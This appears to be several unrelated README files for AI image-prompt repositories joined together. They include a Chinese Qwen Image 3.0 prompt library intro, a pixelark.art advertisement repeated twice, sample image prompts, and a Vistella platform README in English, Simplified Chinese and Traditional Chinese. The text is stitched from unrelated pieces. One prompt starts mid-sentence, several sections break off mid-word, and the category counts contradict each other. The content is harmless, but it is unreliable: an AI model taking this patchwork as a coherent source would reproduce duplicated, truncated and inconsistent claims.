封面和案例均为使用内置 ImageGen 工具新生成的插图，**不是 Qwen 实测输出**。详见[实际提示词与制作说明](./assets/README.md)。 ## 库中内容 - 18 个分类、180 条不同配方，每类十条。 - README、提示词索引和完整配方正文均有 15 种语言版本：共 270 个分类文件、2,700 条语言版本，而不是 2,700 个独立创意。 - 19 张新展示图：一张封面、六张核心案例、十二张维修工坊配方的本地化图片。 - 16 个可复用的[制作模板](./templates/README.md)，以及[场景矩阵](./docs/use-case-matrix.md)、[提示词结构指南](./docs/qwen-image-3-prompt-guide.md)和[多语言排版指南](./docs/multilingual-prompting.md)。这些共享指南以中文维护。 配方按实际需要说明主体、布局、精确文案、参考图角色和重要约束。方括号输入项是需要你提供的材料，不是允许模型编造事实。 ## 从一条配方开始 1. [选择分类](./prompts/README_zh.md)，将所有方括号输入项替换为已获准使用的材料。 2. 编辑图像时，按指定顺序上传获授权的参考图，并说明哪些部分必须保持不变。 3. 复制完整提示词。明确要求多语言的字符串应保持原样；普通本地化版本已包含翻译后的画面文案。 4. 分别按原图尺寸和实际展示尺寸检查文字、数量、物体结构和布局，每次针对一个问题修正。 涉及数据、科学、历史、安全或医疗传播时，请提供经过审核的证据并请合适的专业人员复核。生成的图解和文档不是经过验证的操作说明、正式记录或可编辑生产文件。 ## 为什么围绕 Qwen Image 3.0 设计 Qwen 的[官方公告](https://qwen.ai/blog?id=qwen-image-3.0)强调长指令、精细文字排版、多语言文字和复杂布局。这些方向适合海报、编辑页面、分镜与界面概念，但不保证每次输出都正确。仓库提供十五种语言，不代表模型恰好支持这十五种语言。 配方描述的是视觉意图。实际输入模式、参考图限制、尺寸和可用性取决于所选服务及模型版本。提示词要求某个宽高比或看似透明的背景，并不能证明 API 支持相应功能。 ## 使用 bestimage.ai bestimage.ai 团队在提供图像与视频生成平台的同时维护本提示词库。 - [Qwen Image 3.0 Pro API 与模型入口](https://bestimage.ai/zh/models/alibaba/qwen-image-3-0-pro/)：了解与本库相关的 Qwen 工作流，使用提示词前核对可选模型版本。 - [GPT Image 2 API 与模型入口](https://bestimage.ai/zh/models/openai/gpt-image-2/)：用于相关视觉任务的独立 OpenAI 图像生成与编辑工作流。它不是 Qwen，也不是同一个模型端点。 凭据、请求细节和价格请以所选服务的当前文档为准。 ## ## 在国内直接用这些提示词出图 👉 **[像素方舟 pixelark.art](https://pixelark.art)**：浏览器打开就能用 GPT Image 2.5、GPT Image 2、Nano Banana Pro、Nano Banana 2、Seedream 5 出图。 - 微信 / 支付宝按张付费，¥9.9 起充，点数永久有效 - 新用户注册送 10 点，GPT Image 2 一张 1 点 - 生成失败不扣点 - 每条提示词页面都有「一键做同款」按钮，点一下提示词就填好了；改图类的点「传图做同款」，上传自己的照片或商品图 | 模型 | 特点 | 每张消耗 | |---|---|---| | [GPT Image 2.5](https://pixelark.art/models/gpt-image-2-5) | 中文字也能画准，海报、电商图首选 | 1 点 | | [GPT Image 2](https://pixelark.art/models/gpt-image-2) | 理解力强，听得懂长描述 | 1 点 | | [Nano Banana Pro](https://pixelark.art/models/nano-banana-pro) | 画质最高，支持 4K，改图人物不走样 | 4 点 | | [Nano Banana 2](https://pixelark.art/models/nano-banana-2) | 又快又好，日常出图性价比之选 | 2 点 | | [Nano Banana](https://pixelark.art/models/nano-banana) | 速度最快，适合换背景、换装这类改图 | 1 点 | | [Seedream 5](https://pixelark.art/models/seedream-5) | 中文审美好，人像写真与国风更自然 | 2 点 | ## 提示词怎么写 一条好用的提示词基本是这几块拼起来的：**画面主体 + 细节 + 构图 + 风格 / 光线 + 画面里的文字**。 - 要出中文字（海报标题、包装文案），把字写进引号里，并说清放在哪、什么字体，比如：顶部居中写「夏日限定」四个字，粗黑体 - 写清画幅：竖版 3:4 适合小红书，1:1 适合电商主图，16:9 适合封面 - 改自己的图（换背景、换装、修图）时上传参考图，提示词里写「保持人物 / 产品不变」，再写要改什么 - 详细写法见 [提示词教程](https://pixelark.art/guides) ## ## 在国内直接用这些提示词出图 👉 **[像素方舟 pixelark.art](https://pixelark.art)**：浏览器打开就能用 GPT Image 2.5、GPT Image 2、Nano Banana Pro、Nano Banana 2、Seedream 5 出图。 - 微信 / 支付宝按张付费，¥9.9 起充，点数永久有效 - 新用户注册送 10 点，GPT Image 2 一张 1 点 - 生成失败不扣点 - 每条提示词页面都有「一键做同款」按钮，点一下提示词就填好了；改图类的点「传图做同款」，上传自己的照片或商品图 | 模型 | 特点 | 每张消耗 | |---|---|---| | [GPT Image 2.5](https://pixelark.art/models/gpt-image-2-5) | 中文字也能画准，海报、电商图首选 | 1 点 | | [GPT Image 2](https://pixelark.art/models/gpt-image-2) | 理解力强，听得懂长描述 | 1 点 | | [Nano Banana Pro](https://pixelark.art/models/nano-banana-pro) | 画质最高，支持 4K，改图人物不走样 | 4 点 | | [Nano Banana 2](https://pixelark.art/models/nano-banana-2) | 又快又好，日常出图性价比之选 | 2 点 | | [Nano Banana](https://pixelark.art/models/nano-banana) | 速度最快，适合换背景、换装这类改图 | 1 点 | | [Seedream 5](https://pixelark.art/models/seedream-5) | 中文审美好，人像写真与国风更自然 | 2 点 | ## 目录 | 分类 | 条数 | 在线浏览 | |---|---|---| | [电商主图](prompts/ecommerce.md) | 109 | [pixelark.art/prompts/ecommerce](https://pixelark.art/prompts/ecommerce) | | [海报](prompts/poster.md) | 14 | [pixelark.art/prompts/poster](https://pixelark.art/prompts/poster) | | [写真头像](prompts/portrait.md) | 129 | [pixelark.art/prompts/portrait](https://pixelark.art/prompts/portrait) | | [小红书封面](prompts/xiaohongshu.md) | 89 | [pixelark.art/prompts/xiaohongshu](https://pixelark.art/prompts/xiaohongshu) | | [3D 手办与公仔](prompts/3d-figure.md) | 71 | [pixelark.art/prompts/3d-figure](https://pixelark.art/prompts/3d-figure) | | [换装模特](prompts/fashion.md) | 83 | [pixelark.art/prompts/fashion](https://pixelark.art/prompts/fashion) | | [插画](prompts/illustration.md) | 2 | [pixelark.art/prompts/illustration](https://pixelark.art/prompts/illustration) | | [logo 与品牌设计](prompts/logo.md) | 77 | [pixelark.art/prompts/logo](https://pixelark.art/prompts/logo) | | [摄影](prompts/photo.md) | 75 | [pixelark.art/prompts/photo](https://pixelark.art/prompts/photo) | | [风格化](prompts/stylized.md) | 15 | [pixelark.art/prompts/stylized](https://pixelark.art/prompts/stylized) | | [国风](prompts/guofeng.md) | 51 | [pixelark.art/prompts/guofeng](https://pixelark.art/prompts/guofeng) | | [证件照](prompts/id-photo.md) | 9 | [pixelark.art/prompts/id-photo](https://pixelark.art/prompts/id-photo) | | [修图与扩图](prompts/retouch.md) | 15 | [pixelark.art/prompts/retouch](https://pixelark.art/prompts/retouch) | | [创意玩法](prompts/other.md) | 23 | [pixelark.art/prompts/other](https://pixelark.art/prompts/other) | ## 提示词怎么写 一条好用的提示词基本是这几块拼起来的：**画面主体 + 细节 + 构图 + 风格 / 光线 + 画面里的文字**。 - 要出中文字（海报标题、包装文案），把字写进引号里，并说清放在哪、什么字体，比如：顶部居中写「夏日限定」四个字，粗黑体 - 写清画幅：竖版 3:4 适合小红书，1:1 适合电商主图，16:9 适合封面 - 改自己的图（换背景、换装、修图）时上传参考图，提示词里写「保持人物 / 产品不变」，再写要改什么 - 详细写法见 [提示词教程](https://pixelark.art/guides) ## 在竖版做旧奶油色纸上，不对称地排布四块复古旅行日志拼贴，分别是曼谷、里斯本、马拉喀什和伊斯坦布尔。每一块都把温暖的纪实街头照片与带瑕疵的手绘丝网印刷插画叠在一起，并配上撕纸边、档案相框、淡淡的铅笔痕和打字机字体的标题。曼谷画神龛、缠绕的电线和青色摩托车；里斯本画黄色电车和陡峭的鹅卵石街道；马拉喀什画赤陶色老城、棕榈和地毯；伊斯坦布尔画石街、加拉塔塔和博斯普鲁斯海峡。整体用鼠尾草绿、赭石、赤陶、芥末黄和暖象牙色的克制色调，光线柔和，带真实的 35mm 胶片颗粒。小标签逐字写：Bangkok / Field Note 052、Lisbon / Field Note 031、Marrakech / Field Note 017、Istanbul / Field Note 039。 ``` [打开这条提示词，直接做同款 →](https://pixelark.art/prompts/xiaohongshu/ym-nb-32913) ### 82. 宇航员接到妈妈来电 ```text 一名孤独的宇航员坐在受损飞船的驾驶舱里，舷窗外漂浮着飞船残骸，远处是部分损毁的地球。他面前悬浮着一块蓝色全息屏幕，屏幕显示着来自「妈妈」的通话来电，他伸出手却犹豫不决。深空的寂静笼罩整个舱内，冷蓝色环境光与全息屏幕溢出的体积光交织，胶片颗粒质感，35mm 变形宽银幕构图，电影级写实画面，氛围克制而令人心碎。 ``` [打开这条提示词，直接做同款 →](https://pixelark.art/prompts/xiaohongshu/ym-nb-33918) ### 83. 蒸汽火车冲过风暴断桥 ```text 电影感写实画面：一列巨大的复古蒸汽机车在摇摇欲坠的巨型铁路桥上疾驰，桥下是汹涌海洋，巨浪正拍打桥身。闪电劈下照亮全场，前景里数百滴雨水凝固在半空，闪着细碎光点。机车细节丰富：风化的黑色钢材、抛光的黄铜部件、炉火透出的暖光、阀门喷出的蒸汽、湿漉漉的金属表面、车轮与铁轨摩擦溅起的火花与水花。远处高耸的黑色悬崖没入风暴云层，一座灯塔在暴雨中若隐若现，桥下雾气缭绕，断裂的铁轨伸向远方；一扇温暖明亮的车窗里透出孤独乘客的剪影。构图取铁轨旁的极低视角，铁轨形成强烈引导线指向火车，闪电在车体与蒸汽边缘勾出明亮轮廓，与车内暖光形成冷暖对比，整体呈胶片质感的电影级景深。 ``` [打开这条提示词，直接做同款 →](https://pixelark.art/prompts/xiaohongshu/ym-nb-33922) ### 84. 网格纸手绘食谱便签 ```text 倒椰浆炖煮，每步配可爱的手绘动作图，左下角画一碗诱人的成品绿咖喱。右栏布局相同，标题「冬阴功汤」，食材为虾、香茅、南姜、柠檬叶、蘑菇，三步做法为处理鲜虾 → 煮香茅汤底 → 加虾与柠檬汁，右下角画一碗成品汤。整体采用有机自然的柔和暖色调，手写字迹工整可爱，插图线条圆润。 ``` [打开这条提示词，直接做同款 →](https://pixelark.art/prompts/xiaohongshu/ym-nb-34455) ### 85. 三步流程手绘信息图 ```text 米白背景的横向三栏流程信息图，左上角一个「图3」小徽章加加粗中文大标题「夜班上岗三步流程」，右侧边缘一个简洁抽象小 Logo。三张圆角卡片从左到右并排、用粗箭头连接，边框统一为绿色。每张卡片上方是圆形数字徽章和加粗标题，下面一个胶囊形时段标签，中间是扁平手绘小插画，底部一行简短说明。第一张「掌握白班」「9:00-18:00」「熟悉白天岗位的交接流程」，配在窗边做笔记的女性与窗外太阳；第二张「夜间巡检」「18:00-2:00」「两人一组持手电巡查楼栋」，配两名女性打着手电走在夜色楼宇间；第三张「收尾交接」「2:00-9:00」「整理记录后收工」，配新月夜空下比胜利手势微笑的女性。整体二维扁平插画风，线条干净明快，16:9 横向构图。 ``` [打开这条提示词，直接做同款 →](https://pixelark.art/prompts/xiaohongshu/ym-nb-34456) ### 86. 90年代黑色电影女英雄 ```text 一位三十出头的健美女性，蓬松狂野的铂金色大波浪长发，高颧骨、锐利的湛蓝双眼配烟熏眼妆，上臂有一处细线黑色铁丝网纹身。她身穿亮面黑色皮革紧身胸衣，双手握一把银色电影道具手枪侧身瞄准，双肘锁定，手腕露出带尖刺的镀铬护腕。背景是阴郁的混凝土工业影棚，空气略显朦胧，冷白侧光打亮面部，发丝边缘带青绿色轮廓光，深邃阴影与皮革、金属的镜面高光形成高对比暗调。低角度中景，浅景深与椭圆散景，35mm 胶片细腻颗粒，冷色调，16:9 横构图。 ``` [打开这条提示词，直接做同款 →](https://pixelark.art/prompts/xiaohongshu/ym-nb-36685) ### 87. 盐沟回望的超现实人像 ```text 隔着结满盐霜的失焦木板偷拍视角，一位束起深色头发的女性沿着狭窄的盐沟背身走远，身体微侧，不安地回头张望，脸藏在阴影里。她穿深祖母绿哑光生丝长裙，一手牵着一串悬浮的玻璃球、球内晃着发光的液态水银，另一手提一只巨大的锈铁沙漏。龟裂的白色盐壳、弥漫的金色尘雾，一道强光只打在她背上，勾出头发和玻璃球的金色轮廓。竖构图，前景重虚化，长焦压缩空间，暖调写实材质。 ``` [打开这条提示词，直接做同款 →](https://pixelark.art/prompts/xiaohongshu/ym-nb-36720) ### 88. 大理石人像冷感大片 ```text 一位神情冷漠的年轻女性，眼睑低垂放松，眼线利落上扬，双肩微塌，慵懒地倚靠在一尊古典白色大理石半身像上。她穿一件哑光纯黑修身高领毛衣，与四周密密麻麻堆叠的白色大理石雕像形成强烈对比，雕像像人群一样层层逼近，几乎将她淹没。画面用长焦压缩空间纵深，透过前景两尊失焦雕像之间的窄缝窥视她，面部正好落在这道缝隙里。高调柔和的影棚光，干净通透，突出大理石的多孔质感与皮肤的细腻毛孔，带中画幅胶片的写实颗粒和空气里悬浮的细微石粉，竖幅构图。 ``` [打开这条提示词，直接做同款 →](https://pixelark.art/prompts/xiaohongshu/ym-nb-36877) ### 89. 黑板手写新闻摘要 ```text 做一张黑板风格的手写新闻摘要图：黑板上方用粉笔字写标题「本周科技要闻」，正文分三块，分别写「AI 模型更懂中文」「手机拍照再升级」「新能源车续航提升」，每块配简单粉笔图标和小图表，像老师讲课一样用箭头和圈注串联重点。整体是深绿色黑板、白色与彩色粉笔手写体，构图清晰，适合小红书封面。 ``` [打开这条提示词，直接做同款 →](https://pixelark.art/prompts/xiaohongshu/ym-nb-509)

This reference artwork was made with imagegen for the repository; it is not a Vistella Playground result.* --- ## 💡 What is Vistella? [Vistella (星境)](https://www.vistella.xyz?utm_source=github&utm_medium=repo_intro) is a modern, intuitive AI visual creation platform designed for creators, designers, and visual artists. Instead of wrestling with complex local software installations, GPU requirements, or terminal environments, Vistella empowers you to generate and edit high-quality visual art directly in your web browser with zero setup. This open-source repository serves as the official community resource center: - 📚 **Comprehensive Handbook**: Deep dive into lighting masterclasses, camera lenses, color science, and composition rules. - 🎨 **Domain-Specific Prompt Libraries**: Production-grade prompt formulas for portraits, commercial products, architecture, and digital art. - 🛡️ **Negative Prompt Dictionary**: Curated guardrails to eliminate plastic skin, anatomical errors, and geometric distortions. - 🛠️ **Local Prompt Studio Tools**: Zero-dependency Python CLI tool and standalone offline HTML prompt builder with direct one-click launch to Vistella. - ✨ **Visual Prompt Gallery**: Reference artwork paired with [copyable recipes](prompts/README.md) and a [sharing kit](prompts/distribution-kit.md). --- ## 🗂️ Repository Directory & Quick Navigation ```text vistella/ ├── guides/ # 📚 In-depth Visual Guides │ ├── prompt_engineering_handbook.md # Lighting, optics, color science, and framing │ └── aspect_ratio_guide.md # Optimal ratios (1:1, 3:4, 16:9, 21:9) & layout ├── prompts/ # 🎨 Battle-Tested Prompt Collections │ ├── README.md # Visual gallery and copyable recipe links │ ├── assets/ # Reference artwork and social sharing files │ ├── portraits_and_people.md # Fashion editorials, cyberpunk wanderers, cinema noir │ ├── commercial_and_products.md # Perfumes, smartwatches, sneakers, cosmetics │ ├── architecture_and_spaces.md # Brutalist concrete, zen pavilions, desert retreats │ ├── digital_art_and_illustration.md # Shinkai skies, Ghibli meadows, 80s synthwave │ ├── recipes.md # Curated cross-category highlights │ └── negative_prompts.md # Curated artifact elimination tokens ├── tools/ # 🛠️ Interactive Tools │ └── prompt_builder/ │ ├── index.html # Standalone Web Prompt Studio (Open in browser) │ └── prompt_builder.py # Zero-dependency interactive Python CLI generator └── CONTRIBUTING.md # 🤝 How to submit prompt recipes and improvements ``` --- ## 🚀 Experience Vistella Online No local setup, no heavy installations, and no powerful GPU required: | Feature | Details | | :--- | :--- | | **Instant Access** | Open [vistella.xyz](https://www.vistella.xyz/en/playground?utm_source=github&utm_medium=feature_table) in any desktop or mobile browser. | | **Daily Free Credits** | Create visual studies and explore styles with complimentary credits. | | **Flexible Ratios** | Seamlessly toggle between `1:1`, `16:9`, `9:16`, `3:4`, `4:3`, and `21:9`. | | **Curated Presets** | Fast-track your creativity with built-in aesthetics and parameters. | 👉 [**Start Creating on Vistella Playground Now →**](https://www.vistella.xyz/en/playground?utm_source=github&utm_medium=start_now_cta) --- ## 🎨 Curated Prompt Collections Explore our categorized recipes with lighting, ratio, and aesthetic breakdowns: | Category | Description | Recommended Link | | :--- | :--- | :--- | | **👤 Portraits & People** | Editorial fashion, vintage 1970s warmth, cyberpunk wanderers, studio beauty close-ups | [Browse Portraits →](prompts/portraits_and_people.md) | | **🛍️ Commercial & Products** | Luxury frosted perfumes, exploded 3D smartwatches, skincare serums, sneakers | [Browse Products →](prompts/commercial_and_products.md) | | **🏛️ Architecture & Spaces** | Brutalist concrete residences, Japanese zen pavilions, Scandinavian kitchens | [Browse Architecture →](prompts/architecture_and_spaces.md) | | **🎨 Digital Art & Anime** | Makoto Shinkai skies, Studio Ghibli countryside, retro 80s synthwave, 3D dioramas | [Browse Digital Art →](prompts/digital_art_and_illustration.md) | | **🛡️ Negative Prompts** | Specialized exclusions for hands, skin texture, product clarity, and architectural lines | [View Negative Prompts →](prompts/negative_prompts.md) | | **🖼️ Visual Gallery** | Ten reference scenes, exact imagegen prompts, and reusable social artwork | [Browse Gallery →](prompts/README.md) | --- ## 🛠️ Interactive Prompt Studio We provide two lightweight tools to help you craft structured prompts in seconds: ### 1. Web Prompt Studio (`tools/prompt_builder/index.html`) A standalone single-file visual tool that runs completely offline in any web browser. - Interactive chips for Lighting, Optics, Film Stocks, and Aspect Ratios. - Live real-time prompt compilation. - One-click button: **"🚀 Launch in Vistella Playground"**. ### 2. CLI Prompt Builder (`tools/prompt_builder/prompt_builder.py`) Run directly from your terminal with zero external dependencies: ```bash python tools/prompt_builder/prompt_builder.py ``` Follow the interactive prompts to generate production-ready descriptions and get a direct web link to test them. --- ## 📐 The Universal Prompt Formula To get the most consistent visual quality from modern image generation, structure your text prompts using this 5-part formula: $$\text{Final Artwork} = \text{Subject} + \text{Environment} + \text{Lighting \& Atmosphere} + \text{Camera Optics} + \text{Color \& Material Details}$$ ### Formula Breakdown: 1. **Core Subject**: Define the main character, object, or architecture with specific descriptors (age, clothing, pose, materials). 2. **Environment & Context**: Describe the surrounding space, background elements, weather, or time of day. 3. **Lighting & Mood**: Specify light direction and quality (e.g., *"soft diffused morning sidelight"*, *"volumetric golden hour glow"*). 4. **Camera & Optics**: Guide depth and perspective (e.g., *"shot on 85mm f/1.4 lens, shallow depth of field"*). 5. **Color & Texture**: State the color grade and surface finis

🗂️ 仓库目录与快速导航 ```text vistella/ ├── guides/ # 📚 深度视觉创作指南 │ ├── prompt_engineering_handbook.md # 《提示词工程权威手册》：布光、镜头、色彩、构图 │ └── aspect_ratio_guide.md # 《画幅比例与构图指南》：1:1、3:4、4:5、16:9、21:9 ├── prompts/ # 🎨 细分领域实战提示词宝库 │ ├── README.zh-CN.md # 🖼️ 参考图与提示词入口 │ ├── assets/ # 📷 参考图与分享素材 │ ├── portraits_and_people.md # 👤 人像写真：北欧高定、复古胶片、赛博行者、黑白电影 │ ├── commercial_and_products.md # 🛍️ 商业静物：轻奢香水、3D 机械手表、植萃精华、概念跑鞋 │ ├── architecture_and_spaces.md # 🏛️ 空间建筑：野兽派混凝土、枯山水庭院、北欧厨房 │ ├── digital_art_and_illustration.md # 🎨 数字插画：新海诚夏日天空、吉卜力田园、80s 霓虹赛博 │ ├── recipes.md # 🌟 精选通用高分配方 │ └── negative_prompts.md # 🛡️ 负向排除词典 ├── tools/ # 🛠️ 本地交互式工具 │ └── prompt_builder/ │ ├── index.html # 💻 单文件 Web 提示词工作室（支持中/英/繁三语切换） │ └── prompt_builder.py # 🐍 零依赖 Python 命令行交互式生成器 └── CONTRIBUTING.md # 🤝 社区共建与提示词提交指南 ``` --- ## 🎨 精选场景提示词宝库 每条配方均标注推荐画幅、布光说明与材质细节，附带一键运行直达链接： | 场景分类 | 内容涵盖 | 快速浏览 | | :--- | :--- | :--- | | **👤 人像写真与角色** | 北欧高定时尚、70 年代复古胶片、雨夜赛博黑客、黑白电影侦探、美妆微距 | [浏览人像词库 →](prompts/portraits_and_people.md) | | **🛍️ 商业静物与产品** | 轻奢长笛香水、悬浮拆解机械表、有机植物精华、概念透光跑鞋、手冲咖啡 | [浏览静物词库 →](prompts/commercial_and_products.md) | | **🏛️ 空间建筑与室内** | 悬崖野兽派混凝土别墅、雨季日式庭院、极简斯堪的纳维亚厨房、荒漠夯土庇护所 | [浏览建筑词库 →](prompts/architecture_and_spaces.md) | | **🎨 数字艺术与动漫** | 新海诚夏日积雨云、吉卜力溪边水车、80 年代复古合成波公路、黏土微缩世界 | [浏览插画词库 →](prompts/digital_art_and_illustration.md) | | **🛡️ 负向排除词典** | 针对人像肢体、皮肤塑料感、产品指纹反光、建筑透视变形的专用屏蔽词 | [查看负向词库 →](prompts/negative_prompts.md) | | **🖼️ 配图提示词画廊** | 十种风格与用途的参考图和配方 | [浏览画廊 →](prompts/README.zh-CN.md) | --- ## 🛠️ 本地交互式提示词工作室 仓库自带两款免配置的轻量小工具： ### 1. Web 提示词工作室 (`tools/prompt_builder/index.html`) 无需启动服务器，直接在本地浏览器双击即可运行。 - **多语言界面**：支持**英文、简体中文、繁體中文**一键无缝切换。 - **可视化选词**：点击布光、镜头、色彩、画幅标签实时生成结构化提示词。 - **一键直通**：配备“📋 复制提示词”与“🚀 在 Vistella 中打开生成”功能。 ### 2. Python 终端生成器 (`tools/prompt_builder/prompt_builder.py`) 适合极客在终端使用，无任何第三方包依赖： ```bash python tools/prompt_builder/prompt_builder.py ``` 根据终端指引逐步选择主体、环境、光影、镜头及画幅，即时拼装专业级描述并生成直通链接。 --- ## 📐 通用高分提示词结构法则 告别盲目拼凑无意义标签，遵循专业视觉生成“五步法则”： $$\text{最终画面} = \text{核心主体} + \text{环境空间} + \text{光影氛围} + \text{光学镜头} + \text{色彩与质感}$$ 1. **核心主体**：精准定义人物、物品或建筑的具体特征（年龄、服装、姿态、材质）。 2. **环境空间**：交代主体所处的位置、背景元素、天气或时间。 3. **光影氛围**：明确光源方向与光质（如：“柔和早晨侧光”、“穿透薄雾的丁达尔金光”）。 4. **光学镜头**：控制景深与透视视角（如：“85mm f/1.4 肖像镜头”、“虚化背景奶油感”）。 5. **色彩质感**：指定色彩倾向与表面细节（如：“柯达 Portra 400 暖调”、“微小毛孔与天然细腻肌理”）。 *(更多干货详见 [《提示词工程权威手册》](guides/prompt_engineering_handbook.md))* --- ## 🤝 社区共建 我们热烈欢迎所有创作者贡献灵感！ - 提交在 Vistella 实测高分的新提示词配方 - 补充特定艺术风格的负向排除词 - 完善使用手册与技术翻译 详情请查阅 [贡献指南 (CONTRIBUTING.md)](CONTRIBUTING.md)。 --- ## 📄 开源协议 本项目基于 [MIT 协议](LICENSE) 开源。 ---
由 Ethon1130 与 Vistella 星境社区 用心打造。

[Vistella (星境)](https://www.vistella.xyz?utm_source=github&utm_medium=repo_intro) is a modern, intuitive AI visual creation platform designed for creators, designers, and visual artists. Instead of wrestling with complex local software installations, GPU requirements, or terminal environments, Vistella empowers you to generate and edit high-quality visual art directly in your web browser with zero setup. This open-source repository serves as the official community resource center: - 📚 **Comprehensive Handbook**: Deep dive into lighting masterclasses, camera lenses, color science, and composition rules. - 🎨 **Domain-Specific Prompt Libraries**: Production-grade prompt formulas for portraits, commercial products, architecture, and digital art. - 🛡️ **Negative Prompt Dictionary**: Curated guardrails to eliminate plastic skin, anatomical errors, and geometric distortions. - 🛠️ **Local Prompt Studio Tools**: Zero-dependency Python CLI tool and standalone offline HTML prompt builder with direct one-click launch to Vistella. - ✨ **Visual Prompt Gallery**: Reference artwork paired with [copyable recipes](prompts/README.md) and a [sharing kit](prompts/distribution-kit.md). --- ## 🛠️ Interactive Prompt Studio We provide two lightweight tools to help you craft structured prompts in seconds: ### 1. Web Prompt Studio (`tools/prompt_builder/index.html`) A standalone single-file visual tool that runs completely offline in any web browser. - Interactive chips for Lighting, Optics, Film Stocks, and Aspect Ratios. - Live real-time prompt compilation. - One-click button: **"🚀 Launch in Vistella Playground"**. ### 2. CLI Prompt Builder (`tools/prompt_builder/prompt_builder.py`) Run directly from your terminal with zero external dependencies: ```bash python tools/prompt_builder/prompt_builder.py ``` Follow the interactive prompts to generate production-ready descriptions and get a direct web link to test them. --- ## 📐 The Universal Prompt Formula To get the most consistent visual quality from modern image generation, structure your text prompts using this 5-part formula: $$\text{Final Artwork} = \text{Subject} + \text{Environment} + \text{Lighting \& Atmosphere} + \text{Camera Optics} + \text{Color \& Material Details}$$ ### Formula Breakdown: 1. **Core Subject**: Define the main character, object, or architecture with specific descriptors (age, clothing, pose, materials). 2. **Environment & Context**: Describe the surrounding space, background elements, weather, or time of day. 3. **Lighting & Mood**: Specify light direction and quality (e.g., *"soft diffused morning sidelight"*, *"volumetric golden hour glow"*). 4. **Camera & Optics**: Guide depth and perspective (e.g., *"shot on 85mm f/1.4 lens, shallow depth of field"*). 5. **Color & Texture**: State the color grade and surface finis

🗂️ 倉庫目錄與快速導覽 ```text vistella/ ├── guides/ # 📚 深度視覺創作指南 │ ├── prompt_engineering_handbook.md # 《提示詞工程權威手冊》：佈光、鏡頭、色彩、構圖 │ └── aspect_ratio_guide.md # 《畫幅比例與構圖指南》：1:1、3:4、4:5、16:9、21:9 ├── prompts/ # 🎨 細分領域實戰提示詞寶庫 │ ├── README.zh-TW.md # 🖼️ 參考圖與提示詞入口 │ ├── assets/ # 📷 參考圖與分享素材 │ ├── portraits_and_people.md # 👤 人像寫真：北歐高訂、復古底片、賽博行者、黑白電影 │ ├── commercial_and_products.md # 🛍️ 商業靜物：輕奢香水、3D 機械手錶、植萃精華、概念跑鞋 │ ├── architecture_and_spaces.md # 🏛️ 空間建築：野獸派清水模、枯山水庭院、北歐廚房 │ ├── digital_art_and_illustration.md # 🎨 數位插畫：新海誠夏日積雨雲、吉卜力田園、80s 霓虹合成波 │ ├── recipes.md # 🌟 精選通用高分配方 │ └── negative_prompts.md # 🛡️ 負向排除詞典 ├── tools/ # 🛠️ 本地互動式工具 │ └── prompt_builder/ │ ├── index.html # 💻 單檔案 Web 提示詞工作室（支援中/英/繁三語切換） │ └── prompt_builder.py # 🐍 零依賴 Python 命令列互動式生成器 └── CONTRIBUTING.md # 🤝 社群共建與提示詞提交指南 ``` --- ## 🎨 精選場景提示詞寶庫 每條配方均標註推薦畫幅、佈光說明與材質細節，附帶一鍵運行直達連結： | 場景分類 | 內容涵蓋 | 快速瀏覽 | | :--- | :--- | :--- | | **👤 人像寫真與角色** | 北歐高訂時尚、70 年代復古底片、雨夜賽博駭客、黑白電影偵探、美妝微距 | [瀏覽人像詞庫 →](prompts/portraits_and_people.md) | | **🛍️ 商業靜物與產品** | 輕奢長笛香水、懸浮拆解機械錶、有機植物精華、概念透光跑鞋、手沖咖啡 | [瀏覽靜物詞庫 →](prompts/commercial_and_products.md) | | **🏛️ 空間建築與室內** | 懸崖野獸派清水模別墅、雨季日式庭院、極簡斯堪地那維亞廚房、荒漠夯土避難所 | [瀏覽建築詞庫 →](prompts/architecture_and_spaces.md) | | **🎨 數位藝術與動漫** | 新海誠夏日積雨雲、吉卜力溪邊水車、80 年代復古合成波公路、黏土微縮世界 | [瀏覽插畫詞庫 →](prompts/digital_art_and_illustration.md) | | **🛡️ 負向排除詞典** | 針對人像肢體、皮膚塑料感、產品指紋反光、建築透視變形的專用屏蔽詞 | [查看負向詞庫 →](prompts/negative_prompts.md) | | **🖼️ 圖像提示詞畫廊** | 十種風格與用途的參考圖和配方 | [瀏覽畫廊 →](prompts/README.zh-TW.md) | --- ## 🛠️ 本地互動式提示詞工作室 倉庫自帶兩款免配置的輕量小工具： ### 1. Web 提示詞工作室 (`tools/prompt_builder/index.html`) 無需啟動伺服器，直接在本地瀏覽器雙擊即可運行。 - **多語言介面**：支援**英文、簡體中文、繁體中文**一鍵切換。 - **視覺化選詞**：點擊佈光、鏡頭、色彩、畫幅標籤即時生成結構化提示詞。 - **一鍵直通**：配備「📋 複製提示詞」與「🚀 在 Vistella 中打開生成」功能。 ### 2. Python 終端生成器 (`tools/prompt_builder/prompt_builder.py`) 適合在命令列使用，無任何第三方套件依賴： ```bash python tools/prompt_builder/prompt_builder.py ``` 根據終端指引逐步選擇主體、環境、光影、鏡頭及畫幅，即時拼裝專業級描述並生成直通連結。 --- ## 📐 通用高分提示詞結構法則 告別盲目堆砌無意義標籤，遵循專業視覺生成「五步法則」： $$\text{最終畫面} = \text{核心主體} + \text{環境空間} + \text{光影氛圍} + \text{光學鏡頭} + \text{色彩與質感}$$ 1. **核心主體**：精準定義人物、物品或建築的具體特徵（年齡、服裝、姿態、材質）。 2. **環境空間**：交代主體所處的位置、背景元素、天氣或時間。 3. **光影氛圍**：明確光源方向與光質（如：「柔和早晨側光」、「穿透薄霧的廷得耳金光」）。 4. **光學鏡頭**：控制景深與透視視角（如：「85mm f/1.4 肖像鏡頭」、「虛化背景奶油感」）。 5. **色彩質感**：指定色彩傾向與表面細節（如：「柯達 Portra 400 暖調」、「微小毛孔與天然細膩肌理」）。 *(更多內容詳見 [《提示詞工程權威手冊》](guides/prompt_engineering_handbook.md))* --- ## 🤝 社群共建 我們熱烈歡迎所有創作者貢獻靈感！ - 提交在 Vistella 實測高分的新提示詞配方 - 補充特定藝術風格的負向排除詞 - 完善使用手冊與技術翻譯 詳情請參閱 [貢獻指南 (CONTRIBUTING.md)](CONTRIBUTING.md)。 --- ## 📄 開源授權 本專案基於 [MIT 授權條款](LICENSE) 開源。 ---
由 Ethon1130 與 Vistella 星境社群 用心打造。

# 📐 Vistella Aspect Ratio & Framing Mastery Guide

Choosing the right aspect ratio before generation fundamentally transforms how the visual model balances negative space, subject scale, and compositional geometry.

All ratios below are natively selectable in the [Vistella Web Playground](https://www.vistella.xyz/en/playground?utm_source=github&utm_medium=aspect_ratio_guide).

---

## 📊 Aspect Ratio Overview Table

